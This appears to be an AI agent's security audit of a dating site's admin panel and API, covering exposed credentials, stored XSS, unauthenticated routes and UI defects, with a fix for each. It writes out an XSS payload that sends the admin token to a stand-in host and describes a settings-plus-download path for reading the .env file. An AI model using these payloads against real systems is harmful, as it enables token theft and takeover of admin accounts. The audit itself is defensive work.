# admin-panel

## summary
I read the whole admin server (server.js, routes/adminAuth.js), all three shared JS files, style.css and the admin nginx vhost. I read dashboard, users, user-detail, photo-moderation, reports, settings and login in full, and the head, nav, style block and script start of every other page. I cross-checked every call the pages make against the API's admin routes and controllers (routes/admin.js, adminRoutes.js, middleware/adminAuth.js and controllers/admin/*), and I probed the live domains with curl GET/HEAD only.

**Auth model.** There are two login systems. The one in use: login.html posts to https://api.banjaramatch.com/api/admin/auth/login, which signs a JWT with the API's JWT_SECRET and returns `{_id,email,role}`. The token is stored in `localStorage.token` and also set as a non-httpOnly `token` cookie on .banjaramatch.com. The admin Express server also has its own login (`/api/admin/login` with an `admin_token` cookie). It is dead code but still publicly reachable: nginx sends /api/ on the admin domain to port 4001. Its secret is different from the API's (compared by md5), and the API middleware would reject its tokens anyway because they have no `_id`.

**Page access.** Every page is plain static HTML. nginx serves public/*.html through try_files before Node, so all pages, including debug, flow-test, test-auth and test-dashboard, return 200 without login. Auth happens only in the browser (checkAuth calls /api/admin/auth/me).

**Most serious problems.**
- Three of the public test pages hardcode the admin email and a password. The password matches ADMIN_CREDENTIALS.md and is a very common default.
- Several public forms (contact, community feedback, beta-tester) and user profile fields are rendered with innerHTML without escaping. Any visitor can plant script that steals the admin JWT from localStorage.
- Community-feedback list and update have no auth (live GET returns names and emails).
- On the API, `PUT /api/updateSettings` has no auth, and the public `/api/download-apk` builds its file path from that same settings record. Together they allow arbitrary file download and hijacking the APK download.
- The "Admin APIs" in userRoutes have no auth (banner/add, user/fake-batch, mark-top).

**UI.** There are four separate visual systems:
- style.css with a dark sidebar (most pages)
- Bootstrap 5.3 top navbar (users, broadcast-email)
- Bootstrap 5.2.3 plus a missing css/admin-style.css (beta-testers)
- fully standalone CSS (community-feedback)

contact-enquiries.html contains two full concatenated HTML documents. Nav menus differ on almost every page. There is no mobile sidebar toggle, and views/pages and views/partials are empty.

**Features.** settings.html is mostly fake: save and change-password do nothing, and the stats and bulk actions call endpoints that don't exist. On the users page the verified and status filters are silently ignored because the parameter names don't match the API. The API's user-detail and delete code queries wrong field names: photos and request counts on the detail view and the activity log always come back empty, and deleting a user leaves its notifications and some interest/request records behind. Blocking a user doesn't stop them logging in.

## findings (30)

### [CRITICAL][security] Admin credentials hardcoded in publicly served test/debug pages
- where: /var/www/admin.banjaramatch.com/public/debug.html:48
- evidence: debug.html:48-49 `email: 'admin@banjaramatch.com', password: '[REDACTED]'` (same in test-auth.html:32-33, flow-test.html:71-72). md5 of the hardcoded password == md5 of the password in ADMIN_CREDENTIALS.md (0192023a), which is a top-10 common default. `curl -sI https://admin.banjaramatch.com/debug.html` -> HTTP/2 200; `curl -s .../debug.html | grep -c admin@banjaramatch.com` -> 1
- impact: Anyone can download debug.html/test-auth.html/flow-test.html and read the admin email and password. If that password is still active (very likely, since DEPLOYMENT.md says 'change after first login' and there is no change-password feature), it is a full admin takeover: delete users, read all PII, send broadcast emails, replace the APK.
- fix: Rotate the admin password in Mongo immediately. Delete debug.html, flow-test.html, test-auth.html and test-dashboard.html from public/. Remove the password from ADMIN_CREDENTIALS.md and DEPLOYMENT.md. In the monorepo, never deploy test pages, and block *.html in nginx so only authenticated routes are served.

### [CRITICAL][security] Stored XSS from public contact / feedback / beta-tester forms leads to admin JWT theft
- where: /var/www/admin.banjaramatch.com/public/contact-enquiries.html:381
- evidence: contact-enquiries.html:381 `${contact.name}`, :397 `${contact.message.substring(0, 150)}`, :480, :500 `<div ...>${contact.message}</div>`; community-feedback.html:586 `<strong>${feedback.name}</strong>`, :666 `${feedback.message}`; beta-testers.html:266 `<td>${app.name}</td>`. API stores input unsanitized (ContactController.submitContact / CommunityFeedbackController.submitCommunityFeedback have no escape/sanitize). Admin token is in localStorage (login.html:246 `localStorage.setItem('token', data.token)`).
- impact: An anonymous visitor submits a contact or feedback form with `<img src=x onerror=fetch('//evil?'+localStorage.token)>`. When an admin opens the page, the 7-day admin JWT is stolen and the attacker has full admin API access. The escaped copy of the contact page (line 1039) never runs (see the duplicate-document finding).
- fix: Use one shared escapeHtml/esc helper (community-data.html:433 already has a correct one that also escapes quotes) or build the DOM with textContent in every renderer. Add a CSP (`script-src 'self'`) to the admin vhost. Move the admin token to an httpOnly cookie.

### [CRITICAL][security] User-controlled profile fields rendered unescaped in admin (users, dashboard, user-detail, reports, photos)
- where: /var/www/admin.banjaramatch.com/public/users.html:479
- evidence: users.html:475 `alt="${user.full_name}"`, :479 `<td>${user.full_name || 'N/A'}</td>`, :632 `onclick="deleteUser('${user._id}', '${user.full_name}')"`; dashboard.html:798-805; user-detail.html:94-96 `${user.full_name}`/`${user.bio}`, :163 `value="${user.full_name || ''}"`; reports.html:170-171 and 210-211 (names unescaped, only reason/desc escaped); reports.html:173 `title="${escapeHtml(r.desc || '')}"` (escapeHtml via textContent/innerHTML does not escape quotes); photo-moderation.html:122 `${p.userId?.full_name}`
- impact: Any registered app user can set full_name or bio to an XSS payload. It runs as soon as an admin opens Users, the Dashboard or a report, and steals the admin token. A name containing an apostrophe (common in Indian names) also breaks the Delete button.
- fix: Use the shared escape helper everywhere, or a small `h()` templating helper that auto-escapes. Pass IDs through data-* attributes with event delegation instead of inline onclick string interpolation.

### [CRITICAL][security] Community feedback list/update endpoints are unauthenticated (PII exposed)
- where: /var/www/api.banjaramatch.com/routes/authRoute.js:44
- evidence: authRoute.js:44 `router.get('/community-feedback', CommunityFeedbackController.getAllFeedbacks); // Admin only` and :45 `router.put('/community-feedback/:feedbackId', ...updateFeedbackStatus); // Admin only` (no middleware). Live: `curl https://api.banjaramatch.com/api/auth/community-feedback?limit=1` -> 200 `{"status":true,"data":[{"name":"asd","email":"asdasd@gmail.com",...}],"pagination":{"total":5,...}}`
- impact: Anyone can list every feedback submitter's name, email and phone (up to limit=1000), and can change any feedback's status or admin notes.
- fix: Add adminAuth to both routes, ideally moving them under /api/admin/community-feedback. Update community-feedback.html to use the shared apiRequest helper, which sends the token.

### [CRITICAL][security] Unauthenticated settings mass-assignment combined with public download-apk allows arbitrary file read and APK hijack
- where: /var/www/api.banjaramatch.com/routes/settingsRoute.js:13
- evidence: settingsRoute.js:13 `router.put('/updateSettings', settingsController.updateSettings);` (no auth); controllers/settingsController.js:98 `Object.assign(setting, req.body); await setting.save();`; settingsRoute.js:26 public `router.get('/download-apk'...` with :37 `const filePath = path.join(__dirname, '..', settings.apk.filePath);` then `fs.createReadStream(filePath)`
- impact: An anonymous attacker can PUT `{apk:{filePath:'.env',...}}` and then GET /api/download-apk to download the API .env (JWT_SECRET, DB and mail credentials) and forge admin tokens. Alternatively they can point the APK download (linked from broadcast emails and the website) at a malicious file. Not exploited during this audit (read-only), but the code path is direct.
- fix: Put adminAuth on /updateSettings, /documentTypes* and /reportReasons*, or delete them, since /api/admin/settings already exists. Whitelist the fields that can be updated. In download-apk, resolve the path and confirm it stays inside uploads/apk.

### [CRITICAL][security] "Admin APIs" in userRoutes have no auth (banner add, fake user batch, mark-top)
- where: /var/www/api.banjaramatch.com/routes/userRoutes.js:87
- evidence: userRoutes.js:86-91 `// Admin APIs` / `router.post('/banner/add',  UserController.addBanner);` / `router.post('/user/fake-batch', UserController.createFakeBatch);` / `router.post('/user/mark-top', ...)` / `router.post('/user/unmark-top', ...)`; UserController.js:4184 `const banner = new Banner(req.body);`
- impact: Anyone can inject banners shown in the app (phishing links), create batches of 30 fake users, or promote any profile to 'top'. The admin panel has no UI to clean any of this up.
- fix: Delete these routes or move them under /api/admin with adminAuth. Banner CRUD already exists at /api/admin/banners.

### [HIGH][security] Admin user-detail API returns password hash and users.html displays it
- where: /var/www/admin.banjaramatch.com/public/users.html:614
- evidence: users.html:614 `<tr><th>Password (Hash):</th><td>...${user.password || 'Not set (OTP login)'}</small></td></tr>`; controllers/admin/userController.js:88-93 `User.findById(id).populate(...).lean()` (no `.select('-password -device_token')`, unlike getAllUsers line 51)
- impact: Every user's bcrypt hash and FCM device_token are sent to the browser and shown on screen. Combined with the XSS findings, they can be stolen in bulk for offline cracking or push-notification abuse.
- fix: Add `.select('-password -device_token')` to getUserById and remove the password row from the UI.

### [HIGH][filter] Users page verification/status filters are silently ignored (param name mismatch)
- where: /var/www/admin.banjaramatch.com/public/users.html:415
- evidence: users.html:415 `if (verified) params.append('is_verified', verified);` :416 `if (blocked) params.append('is_block', blocked);` vs userController.js:22-23 destructures `status, verified` and :41-44 `if (status === 'blocked') ... if (verified === 'true') query.is_verified = 1;`
- impact: Choosing Verified/Unverified or Active/Blocked returns the unfiltered list, so admins act on wrong data. The platform filter maps to last_login_platform (line 40) while the detail view labels by registration_platform (line 114), so the two disagree.
- fix: Settle on one query contract, e.g. `?verified=1|0&blocked=1|0&platform=`. Build it in a shared listQuery helper and validate it on the API (whitelist the sort field and escape the search regex).

### [HIGH][business-logic] Admin 'Block' does not stop the user: no is_block check at login or in auth middleware
- where: /var/www/api.banjaramatch.com/middleware/authMiddleware.js:13
- evidence: authMiddleware.js:13-15 `const decoded = jwt.verify(token, JWT_SECRET); req.user = decoded; next();` (no DB/is_block check); `grep -i block controllers/AuthController.js` -> no matches; reports.html:255 promises 'They will be immediately blocked from the platform.'
- impact: Blocked or reported abusers keep chatting and messaging with their existing 7-day JWT, and can even log in again. Blocking only hides them from some discovery queries.
- fix: Reject is_block users in every login handler and in authenticate (cache the lookup or add a tokenVersion field). Have the socket.io auth check it too.

### [HIGH][data-integrity] Admin user detail/activity/delete query wrong schema fields
- where: /var/www/api.banjaramatch.com/controllers/admin/userController.js:100
- evidence: userController.js:100 `UserPhoto.find({ user: id })` but models/UserPhoto.js:5 field is `userId`; :104-105 `FriendshipRequest.countDocuments({ from: id })/({ to: id })` but model fields are `requester`/`recipient`; :489 `ActivityLog.find({ user: id })` but model field is `userId`; :380 delete `Notification.deleteMany({ $or: [{ sender_id: id }, { receiver_id: id }] })` but model fields are `fromUser`/`toUser`
- impact: The admin always sees zero photos, zero interest-request stats and an empty activity log. Deleting a user leaves their notifications behind in the database.
- fix: Fix the field names, and add a shared `cascadeDeleteUser(id)` service that both the admin API and the app's self-delete use.

### [HIGH][business-logic] Settings page is mostly fake: no-op save, fake password change, bulk ops hit non-existent endpoints
- where: /var/www/admin.banjaramatch.com/public/settings.html:190
- evidence: settings.html:190-193 `function saveAppSettings(event) { event.preventDefault(); showNotification('Settings saved successfully', 'success'); }`; :319-325 changePassword only shows 'Password changed successfully'; :175-178 `apiRequest('/api/users?limit=10000')`, `'/api/banners'`, `'/api/castes'`, `'/api/gotras'` -> live curl all 404 text/html; :204 `PUT /api/users/${user._id}`, :278 `DELETE /api/users/${user._id}` (no such routes)
- impact: Admins believe settings and passwords were changed when nothing happened, so the default password stays in place. The Danger Zone sends one request per user from the browser with no server-side transaction. It is broken today, but would mass-delete users if those routes ever appear.
- fix: Rebuild Settings on GET/PUT /api/admin/settings with a whitelisted schema. Add a real POST /api/admin/auth/change-password. Delete the client-side bulk delete/verify loops, or replace them with audited server-side jobs.

### [HIGH][security] Logout broken on several pages (wrong localStorage key, 404 redirect, cookie not cleared)
- where: /var/www/admin.banjaramatch.com/public/city-pages.html:900
- evidence: city-pages.html:900-902 `function logout() { localStorage.removeItem('adminToken'); window.location.href = '/login'; }` (same in state-pages.html:960, regional-pages.html:327, contact-enquiries.html:598); users.html:781-783 removes only 'token' and goes to 'login.html'; `curl https://admin.banjaramatch.com/login` -> 404. These page-local functions override auth.js `logout()`.
- impact: Clicking Logout on City, State or Regional pages or Contact Enquiries leaves the real `token` in localStorage, and the `token` cookie on .banjaramatch.com stays for 7 days, so the session persists on shared machines. The redirect lands on a 404.
- fix: Delete all page-local logout functions and keep a single shared auth.js logout that calls /api/admin/auth/logout (which clears the cookie), clears storage and redirects to /.

### [HIGH][security] No rate limit on admin login; role is checked before the password (admin enumeration)
- where: /var/www/api.banjaramatch.com/controllers/admin/authController.js:35
- evidence: authController.js:35-41 `if (user.role !== 'admin') { ... return res.status(403).json({ ... 'Access denied. Admin privileges required.' }) }` runs before `bcrypt.compare` at :44; `grep limit_req /etc/nginx/...` and `grep express-rate-limit` -> no matches
- impact: Unlimited online password guessing against admin@banjaramatch.com. Different error codes (401 vs 403) reveal which emails are registered and which are admins.
- fix: Add express-rate-limit or nginx limit_req on /api/admin/auth/login and the user auth routes. Return a generic 401 after checking the password. Consider 2FA or an IP allowlist for admin.

### [MEDIUM][ui] contact-enquiries.html contains two full HTML documents; the second script throws a SyntaxError
- where: /var/www/admin.banjaramatch.com/public/contact-enquiries.html:937
- evidence: `</html>` at line 606 followed by a second `<head>` block ending at 767 and `</html>` at 1246; line 297 `const API_URL = 'https://api.banjaramatch.com';` and line 938 `const API_URL = 'https://api.banjaramatch.com';` (top-level const redeclared in a second classic script -> 'Identifier has already been declared'); bootstrap.bundle loaded at 294 and 933
- impact: The page renders a navbar, then a second sidebar copy with duplicate element IDs. The escaped (safer) second script never runs, Bootstrap JS is loaded twice, and the layout is inconsistent.
- fix: Rewrite the page as a single module on the shared layout.

### [MEDIUM][ui] Four different design systems and inconsistent navigation across pages
- where: /var/www/admin.banjaramatch.com/public/users.html:101
- evidence: users.html:7 Bootstrap 5.3 + top navbar with 4 links; beta-testers.html links bootstrap@5.2.3 and `css/admin-style.css` (curl -> 404); community-feedback.html has a 334-line standalone <style> and its own checkAuth (line 495); the style.css sidebar on dashboard has 15 links, settings/user-detail have 7, constants has 8. city-pages and state-pages appear only on regional/city/state sidebars; apk-manager and broadcast-email only on dashboard, photo-moderation and reports; broadcast-email nav has 5 links
- impact: Admins lose the menu as they move between pages, and some pages (Blogs, City/State pages, APK, Broadcast) are reachable only from certain screens. Colors, tables, modals, badges and toasts all look different.
- fix: Use one layout partial (sidebar + topbar) generated from one nav config, one CSS file with design tokens, and no Bootstrap mix. See 'reusable'.

### [MEDIUM][ui] Sidebar is unreachable on mobile (hidden with no toggle)
- where: /var/www/admin.banjaramatch.com/public/css/style.css:619
- evidence: style.css:619-625 `@media (max-width: 768px) { .sidebar { transform: translateX(-100%); ... } .sidebar.active { transform: translateX(0); }` and no page toggles `.sidebar.active` (grep for toggleSidebar/hamburger/sidebar classList toggle -> none)
- impact: On a phone every sidebar page has no navigation at all.
- fix: Add a hamburger button in the shared topbar that toggles .sidebar.active, plus an overlay.

### [MEDIUM][security] All admin HTML (including test pages) is publicly served; auth is only client-side
- where: /etc/nginx/sites-available/admin.banjaramatch.com:20
- evidence: nginx admin vhost:19-21 `location / { try_files $uri $uri/ @nodejs; }` with root public; curl -sI users.html/debug.html/flow-test.html/test-auth.html/test-dashboard.html -> HTTP/2 200; server.js has no auth middleware before express.static (line 34)
- impact: The full UI and its JS (endpoint map, hardcoded credentials) are public. Data still needs a token, but there is no defense in depth, and there is no robots.txt or noindex (robots.txt -> 404).
- fix: In the monorepo, serve /admin through Node with a server-side session check before any HTML. Return 404 for *.html and remove try_files static serving of pages. Add `X-Robots-Tag: noindex`.

### [MEDIUM][security] Admin and user share the non-httpOnly `token` cookie; adminAuth prefers the cookie over the Bearer header
- where: /var/www/api.banjaramatch.com/middleware/adminAuth.js:12
- evidence: adminAuth.js:12 `const token = req.cookies?.token || req.headers.authorization?.split(' ')[1];`; authController.js:67-73 `res.cookie('token', token, { httpOnly: false, ... domain: '.banjaramatch.com' })`; AuthController.js:33-43 user login sets the same `token` cookie on .banjaramatch.com
- impact: If an admin logs in as a normal user on www, the user cookie overrides the admin Bearer token and admin calls fail with 403. The admin JWT is readable by any script on any *.banjaramatch.com page, so XSS on www also leaks the admin token. Cookie auth with SameSite=Lax on the parent domain allows same-site CSRF.
- fix: Use a separate httpOnly, Secure, SameSite=Strict `admin_session` cookie scoped to the admin host (or /admin path after the monorepo move). Prefer the Authorization header, or require a CSRF token, and stop storing tokens in localStorage.

### [MEDIUM][security] Tokens and PII written to logs
- where: /var/www/api.banjaramatch.com/middleware/adminAuth.js:15
- evidence: adminAuth.js:15 `console.log('🔐 [adminAuth] Cookies:', req.cookies);`; authController.js:115 `console.log('✅ [Admin GetMe] JWT decoded:', decoded);`; admin public/js/api.js:54 `console.log('📤 Fetch config:', config);` (includes the Authorization header)
- impact: Every admin request writes a live JWT into the pm2 logs, so anyone with log access can replay admin sessions. Browser consoles also show the tokens.
- fix: Remove these debug logs and use a leveled logger with redaction.

### [MEDIUM][business-logic] user-detail toggles verify/block through a generic PUT (skips notifications and reason); gender 'Other' is invalid
- where: /var/www/admin.banjaramatch.com/public/user-detail.html:493
- evidence: user-detail.html:493-496 `apiRequest(`/api/admin/users/${currentUser._id}`, { method: 'PUT', body: JSON.stringify({ is_verified: ... }) })` instead of POST /users/:id/verify (which sends push + email, userController.js:251-315); :186 `<option value="Other"` vs enum/enum.js:4 `GENDER_ENUM = ['Male', 'Female', 'Not specified']`; also, no page links to /user-detail (grep finds no references)
- impact: Users verified from the detail page never get the verification push or email. Saving with gender 'Other' fails validation with a 500. The page is orphaned anyway.
- fix: Make one user detail page (linked from the users list) that calls the dedicated verify/block endpoints. Load enum options from the API.

### [MEDIUM][business-logic] Photo moderation queue is always empty; cancelling the reject prompt still rejects
- where: /var/www/admin.banjaramatch.com/public/photo-moderation.html:170
- evidence: models/UserPhoto.js:16 `moderationStatus: { ..., default: 'approved' }` while the page defaults to `<option value="pending" selected>` (line 78); :170 `const reason = window.prompt(...) || '';` then always POSTs reject; only UserController.js:4565 filters rejected photos (the main `profile` image is never affected)
- impact: The default view shows nothing, so moderation doesn't really happen. Clicking Cancel still rejects the photo. A rejected main profile picture stays visible.
- fix: Default to 'approved' / 'recent uploads' or make new uploads 'pending'. Treat prompt()===null as cancel. When the rejected photo is the profile picture, clear User.profile.

### [MEDIUM][data-integrity] Constants (caste/gotra/profession, etc.) can be deleted while users still reference them
- where: /var/www/api.banjaramatch.com/controllers/admin/constantsController.js:79
- evidence: constantsController.js:79 `const item = await Model.findByIdAndDelete(id);` with no reference check; constants.html:178 delete button on every chip, no edit (PUT endpoints unused)
- impact: Profiles end up pointing at deleted IDs: populate returns null, profiles show N/A, and match filters and public gotra/SEO pages lose entries.
- fix: Block the delete (or soft-delete with isActive) when User.countDocuments({field:id}) > 0, and add edit in the UI.

### [MEDIUM][perf] Unversioned admin JS/CSS cached for 1 year as immutable
- where: /etc/nginx/sites-available/admin.banjaramatch.com:50
- evidence: vhost:50-53 `location ~* \.(...css|js...)$ { expires 1y; add_header Cache-Control "public, immutable"; }`; curl /js/auth.js -> `cache-control: public, immutable`; pages load `/js/auth.js`, `/js/api.js` without ?v= (photo-moderation.html:99-100, reports.html:132-133) or with stale manual ?v=1764497821
- impact: After a push-to-deploy, admins keep running old auth.js/api.js for up to a year, so fixes such as XSS escaping and logout won't reach them. This undermines the planned CI/CD.
- fix: Use content-hashed filenames from the build step, or inject ?v=<git sha> in the layout. Only hashed assets should be immutable.

### [MEDIUM][security] API JWT secret is short (15 chars) and code falls back to hardcoded defaults
- where: /var/www/api.banjaramatch.com/middleware/adminAuth.js:4
- evidence: adminAuth.js:4 `const JWT_SECRET = process.env.JWT_SECRET || 'your_jwt_secret';` (same in authMiddleware.js:3, admin authController.js:5); API .env JWT_SECRET length = 15 (differs from the default); admin routes/adminAuth.js:6 `process.env.JWT_SECRET || 'your_admin_jwt_secret'`
- impact: A 15-character HS256 secret can be brute-forced offline from any leaked token (localStorage, logs). If the env var is ever missing, the public default is used and anyone can forge admin tokens.
- fix: Use a random secret of at least 64 bytes, fail fast at boot if it is missing, and rotate it, which invalidates all sessions.

### [MEDIUM][security] APK upload filter accepts any file extension if the MIME type is octet-stream; files are served statically
- where: /var/www/api.banjaramatch.com/middleware/apkUpload.js:39
- evidence: apkUpload.js:39 `if (allowedMimeTypes.includes(file.mimetype) || ext === '.apk')` with 'application/octet-stream' allowed; :20-23 filename keeps the original `ext`; index.js:68 `app.use('/uploads', express.static('uploads'));`
- impact: A stolen admin token (see the XSS findings) can upload .html or .svg to /uploads/apk, which becomes persistent XSS on api.banjaramatch.com.
- fix: Require the .apk extension AND check the ZIP magic bytes, and force the .apk extension on save.

### [LOW][dead-code] Dead admin-server auth routes and ~400 lines of dead regional code in dashboard
- where: /var/www/admin.banjaramatch.com/routes/adminAuth.js:6
- evidence: server.js:37 `app.use('/api/admin', require('./routes/adminAuth'));` (nginx /api/ -> 4001, so live at admin.banjaramatch.com/api/admin/login; `curl .../api/admin/verify` -> 401 JSON) but no page calls it; dashboard.html:483-665 and 1114-1526 regional section, `showRegionalSection` is never invoked and `regionalMenuLink`/`dashboardSection` IDs don't exist
- impact: Extra attack surface (a second unlimited login endpoint) and confusing maintenance. City pages are managed in two places.
- fix: Remove routes/adminAuth.js and the dashboard regional block. Move Blogs into its own /blogs page.

### [LOW][ui] Inconsistent toasts, alerts, pagination and stats logic
- where: /var/www/admin.banjaramatch.com/public/js/notifications.js:3
- evidence: notifications.js:3 redefines `showNotification` (overrides api.js:87) with innerHTML `<span>${message}</span>` (line 18); dashboard uses alert() (e.g. :999); photo-moderation.html:153 and reports.html:195 render every page number; city-pages.html:555 `updateStats(pages)` uses the current page only (20 rows); user-detail.html:91 uses dead via.placeholder.com and doesn't prefix relative `user.profile` with the API host (users.html:464 does)
- impact: Feedback looks different on each page, pagination overflows on large lists, stats are wrong once there are more than 20 city pages, and images break.
- fix: Use shared toast(), pagination(), imageUrl() and stats helpers.

### [LOW][business-logic] Dashboard 'Active Users' means 'not blocked', not active
- where: /var/www/api.banjaramatch.com/controllers/admin/dashboardController.js:24
- evidence: dashboardController.js:24 `User.countDocuments({ is_block: 0 }),` shown as 'Active Users' (dashboard.html:104)
- impact: The KPI is misleading; it doesn't reflect real engagement.
- fix: Count users with lastSeen in the last 7/30 days (DAU/MAU) and label 'Not blocked' separately.

### [LOW][business-logic] Broadcast email has no unsubscribe, throttling or job tracking
- where: /var/www/api.banjaramatch.com/routes/admin.js:214
- evidence: admin.js:214 fire-and-forget `sendBroadcastEmail(users, ...)`; emailService.js:257-271 sequential `for (const user of users) await transporter.sendMail(...)` with `bodyHtml.replace(/\{\{name\}\}/g, user.full_name || 'there')` (no escaping, no unsubscribe link)
- impact: A large send can hit SMTP limits and get the domain flagged as spam. A pm2 restart mid-send loses progress. There is no List-Unsubscribe header, which Gmail/Yahoo now require for bulk mail.
- fix: Queue the sends (Mongo-backed job with progress), throttle, add an unsubscribe link and header, and escape the name.

### [LOW][security] Production API CORS allows localhost/LAN origins with credentials
- where: /var/www/api.banjaramatch.com/index.js:32
- evidence: index.js:32-37 `'http://localhost:3000', ..., 'http://192.168.1.13:3000', 'http://localhost:8080', 'http://localhost:8081'` with `credentials: true`
- impact: Any page served from those origins on an admin's machine can make credentialed requests with the shared `token` cookie.
- fix: Load allowed origins from env per environment. After the monorepo move everything is same-origin, so most CORS can go.

## inventory
- ROUTING: nginx admin vhost root=/var/www/admin.banjaramatch.com/public, `location / { try_files $uri $uri/ @nodejs }` -> every /*.html is served statically by nginx (no auth); extensionless routes (/dashboard,/users,/reports,/photo-moderation,/contact-enquiries,/community-feedback,/beta-testers,/banners,/regional-pages,/city-pages,/state-pages,/community-data,/constants,/settings,/apk-manager,/broadcast-email,/user-detail) fall through to node :4001 server.js sendFile; `/` -> login.html (nginx index); /api/ -> :4001 (admin server, NOT the API)
- AUTH (actually used): login.html POST https://api.banjaramatch.com/api/admin/auth/login {email,password} -> JWT(API JWT_SECRET, payload {_id,email,role}, 7d) stored as localStorage 'token' + non-httpOnly cookie 'token' domain .banjaramatch.com; every page sends Authorization: Bearer <localStorage token|admin_token>; checkAuth() (js/auth.js) GETs /api/admin/auth/me and requires role==='admin'. API adminAuth (middleware/adminAuth.js) verifies with API JWT_SECRET + DB role check, cookie takes precedence over header
- AUTH (dead): admin server routes/adminAuth.js POST /api/admin/login (ADMIN_USERNAME + bcrypt ADMIN_PASSWORD from admin .env) -> cookie admin_token signed with admin JWT_SECRET (different secret from API; md5 a0b1aa58 vs b120d74c); payload lacks _id so API would reject it; no page calls it
- admin .env keys: PORT(=4001), API_BASE_URL(=https://api.banjaramatch.com), JWT_SECRET, ADMIN_USERNAME, ADMIN_PASSWORD (bcrypt $2a$, 60 chars)
- login.html | route / | no sidebar | Bootstrap 5.3 CDN + 106-line <style> | no shared JS | base hardcoded https://api.banjaramatch.com | stores localStorage 'token' | pre-checks /api/admin/auth/me
- dashboard.html (1637 lines) | /dashboard | style.css sidebar(15 links)+topbar | style.css + 38-line <style> + 126 inline style attrs + 39 inline handlers | chart.js@4 CDN, /js/auth.js, /js/api.js?v=1764600897 | apiRequest('/api/admin/dashboard/stats|recent-users|user-growth|engagement') + raw fetch with const API_URL='https://api.banjaramatch.com' for /api/admin/blogs*, /api/states (POST), /api/cities (POST), /api/city-pages/admin* | Bearer localStorage 'token' | checkAuth on load: yes | embeds Blog CRUD + dead Regional section
- users.html (787) | /users | Bootstrap navbar (Dashboard, Users, Reports, Photo Moderation, Logout only) no sidebar | Bootstrap 5.3 CDN + 89-line <style> | js/auth.js, js/api.js | apiRequest /api/admin/users?page&limit&search&gender&registration_platform&is_verified&is_block, /api/admin/users/:id (GET/PUT/DELETE), /:id/verify, /:id/block, /api/admin/dashboard/stats | checkAuth: yes | own logout() overrides shared
- user-detail.html (553) | /user-detail?id= | style.css sidebar (7 links) | style.css only, 19 inline styles | auth.js, api.js ?v=1764497821 | /api/admin/users/:id (GET/PUT/DELETE), /:id/blocks | checkAuth: yes | orphaned (no page links to it)
- reports.html (292) | /reports | style.css sidebar (15 links) | 13-line <style> | auth.js, api.js | /api/admin/reports, /reports/stats, /reports/:id, PATCH /reports/:id/status, POST /reports/:id/block-user | checkAuth: yes | local escapeHtml (doesn't escape quotes; names unescaped)
- photo-moderation.html (188) | /photo-moderation | style.css sidebar (15) | 16-line <style> | auth.js, api.js | /api/admin/photos?status&page&limit=40, POST /photos/:id/approve|reject | checkAuth: yes
- settings.html (337) | /settings | style.css sidebar (7) | no <style>, 10 inline | auth.js, api.js | calls NON-EXISTENT GET /api/users, /api/banners, /api/castes, /api/gotras, PUT/DELETE /api/users/:id (all 404) | checkAuth: yes | save/changePassword/export/clearCache are client-only no-ops
- banners.html (244) | /banners | style.css sidebar | no <style> | auth.js, api.js | /api/admin/banners GET/POST, /banners/:id GET/PUT/DELETE | checkAuth: yes | no isActive/order/type, URL-only image
- constants.html (256) | /constants | style.css sidebar (8) | no <style> | auth.js, api.js | /api/admin/constants/{castes,professions,qualifications,income-ranges,interests} GET/POST/DELETE (no edit) | checkAuth: yes
- community-data.html (898) | /community-data | style.css sidebar | 71-line <style>, 43 inline handlers | auth.js, api.js | /api/admin/constants/{clans,gotras,surname-titles}, /api/admin/gotras/ai-suggest|ai-apply | checkAuth: yes | has correct esc() helper
- community-feedback.html (845) | /community-feedback | own .navbar + .nav-menu (no shared CSS) | FontAwesome 6.0 + 334-line standalone <style> | NO auth.js/api.js | own checkAuth -> /api/admin/auth/me; data via unauthenticated https://api.banjaramatch.com/api/auth/community-feedback (GET ?limit=1000, PUT /:id) with no token
- contact-enquiries.html (1246, two concatenated documents) | /contact-enquiries | Bootstrap navbar AND second fake sidebar | Bootstrap 5.3 x2 + FA 6.4 + css/style.css + 254 lines <style> | js/auth.js, bootstrap.bundle x2, js/api.js | window.fetch monkey-patched to add Bearer for /api/contact/; fetch https://api.banjaramatch.com/api/contact/all|:id|:id/read|:id/status|DELETE :id | checkAuth not awaited (DOMContentLoaded)
- beta-testers.html (398) | /beta-testers | sidebar | Bootstrap 5.2.3 + FA 6.4 + css/admin-style.css (404) + 25-line <style> | js/auth.js only | fetch monkey-patched for /beta-tester/; const API_URL='https://api.banjaramatch.com/api' -> /beta-tester/stats, /all, /:id/read, /:id/status | checkAuth not awaited
- broadcast-email.html (814) | /broadcast-email | Bootstrap navbar (5 links) | Bootstrap 5.3 + icons + 143-line <style> + 32 inline | js/auth.js, js/api.js | /api/admin/broadcast-email/preview|send|send-test, /api/admin/users?search&limit=10 | checkAuth: yes
- apk-manager.html (716) | /apk-manager | style.css sidebar | 240-line <style> | js/auth.js only (no api.js) | const API_BASE_URL='https://api.banjaramatch.com/api' -> /admin/apk/info|upload(XHR)|update-info|delete with Bearer adminToken | checkAuth: yes | own logout -> /login (404)
- regional-pages.html (333) | /regional-pages | style.css sidebar (incl city/state) | 144-line <style> | auth.js, api.js, notifications.js | /api/city-pages/admin/all, /api/state-pages/admin/all (counts) | checkAuth: yes | own logout broken
- city-pages.html (906) | /city-pages | style.css sidebar | FA 6.0 + 117-line <style> | auth.js, api.js, notifications.js | /api/states (POST), /api/cities (POST {state}), /api/city-pages/admin, /admin/all, /admin/:id, /admin/prefill/:cityId, /admin/:id/refresh-stats | checkAuth: yes | own logout broken
- state-pages.html (966) | /state-pages | style.css sidebar | FA 6.0 + 100-line <style> | auth.js, api.js, notifications.js | /api/states, /api/state-pages/admin, /admin/all, /admin/:id, /admin/prefill/:stateId, /admin/hierarchy, /admin/:id/refresh-stats | checkAuth: yes | own logout broken
- debug.html / flow-test.html / test-auth.html / test-dashboard.html | public 200 | no layout | hardcoded admin email+password (debug.html:48-49, flow-test.html:71-72, test-auth.html:32-33) | call /api/auth/loginWithEmail, /api/auth/me, /api/admin/dashboard/stats | DELETE
- API admin endpoints with NO UI: GET /api/admin/users/:id/activity (also broken field), POST /api/admin/users/:id/reset-password, POST /api/admin/banners/:id/toggle-status, PUT /api/admin/constants/{castes,professions,qualifications,income-ranges,interests}/:id, all /api/admin/constants/report-reasons*, all /api/admin/constants/about-options*, GET/PUT /api/admin/settings, PATCH /api/admin/blogs/:id/featured, DELETE /api/beta-tester/:id, GET /api/contact/stats (if unused), POST /api/assignMembership (adminAuth, no UI), POST /api/user/mark-top|unmark-top|fake-batch, /api/banner/add (unauthenticated)
